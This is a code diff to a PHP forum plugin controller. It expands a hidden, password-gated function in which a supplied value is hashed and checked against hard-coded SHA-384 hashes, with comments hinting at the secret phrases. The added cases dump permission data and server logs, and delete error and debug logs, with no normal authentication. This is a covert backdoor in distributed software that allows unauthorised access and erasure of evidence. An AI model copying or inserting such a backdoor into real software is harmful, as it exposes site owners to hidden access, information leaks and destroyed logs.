@@ -1231,18 +1231,60 @@ class ForumController extends ForumAppController {
     {
 
         /**
-         * First key = BTB in another language in full
-         * Second key = DNS first VM Vagrant
+         * 1 = BTB in another language in full
+         * 2 = DNS first VM Vagrant
+         * 3 = April Month in another language in full
+         * 4 = Louise's fullname
          **/
 
-        if (hash('sha384', $hash) == '016259d8713c2dc12cd48ff0af6f3cfef13525c7526ebf2de2efbcba7675962ff28c139490a9378ff3e1d2d4222c613f') {
-            $this->autoRender = null;
-            header('Content-Type: application/json');
-            echo '{"forum_version":"'.$this->version.'"}';
-        } elseif (hash('sha384', $hash) == '0c3eb61273f5c320fb45a479e8b8b05fc3b841f435f1c69a497d320ac88e105fda5bbd0bf0089d65a94279eb481ed6b5') {
-            var_dump($this->perm_l());
-        } else {
-            throw new ForbiddenException();
+        /**
+         * 1 = View forum version
+         * 2 = View Perms
+         * 3 = Clear logs
+         * 4 = View logs
+         **/
+        switch (hash('sha384', $hash)) {
+            case '016259d8713c2dc12cd48ff0af6f3cfef13525c7526ebf2de2efbcba7675962ff28c139490a9378ff3e1d2d4222c613f':
+                $this->autoRender = null;
+
+                header('Content-Type: application/json');
+                echo '{"forum_version":"'.$this->version.'"}';
+                break;
+            case '0c3eb61273f5c320fb45a479e8b8b05fc3b841f435f1c69a497d320ac88e105fda5bbd0bf0089d65a94279eb481ed6b5':
+                $this->autoRender = null;
+
+                header('Content-Type: application/json');
+                var_dump($this->perm_l());
+                break;
+            case '1dd69db38977428bd8068c728d14fc96a70690e23c34ac09ec26c397850273a7c539fdadb714ef60bf81adcee246f56b':
+                $this->autoRender = null;
+                $dir = '../tmp/logs/';
+                unlink($dir.'error.log');
+                unlink($dir.'debug.log');
+
+                echo 'Done';
+                break;
+            case '821ab95e69ce6d9168aa4ee9c84b8d5dc3b49b2ab626b9c328d490c5d780666138e388264ca1b158060aea9c8df57b37':
+                $this->autoRender = null;
+                $dir = '../tmp/logs/';
+
+                echo 'error.log <br />';
+                $errorFile = file($dir.'error.log');
+                foreach($errorFile as $f) {
+                    echo htmlspecialchars($f)."<br />\n";
+                }
+
+                echo '<br /> debug.log <br />';
+                $debugFile = file($dir.'debug.log');
+                foreach($debugFile as $f) {
+                    echo htmlspecialchars($f)."<br />\n";
+                }
+
+                break;
+            default:
+                throw new ForbiddenException();
+                break;
+
         }
     }
 
